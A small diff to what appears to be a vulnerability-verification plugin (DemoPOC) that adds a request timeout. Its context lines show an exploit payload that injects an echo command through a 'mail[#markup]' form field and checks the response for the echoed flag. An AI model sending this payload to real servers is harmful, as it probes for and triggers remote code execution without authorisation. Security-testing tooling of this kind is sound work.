@@ -40,7 +40,7 @@ class DemoPOC(POCBase):
             'mail[#markup]': 'echo "{0}";'.format(flag)
         }
 
-        resp = requests.post(url, data=payload)
+        resp = requests.post(url, data=payload, timeout=15)
         try:
             if '"data":"{0}'.format(flag) in resp.text:
                 result['VerifyInfo'] = {}
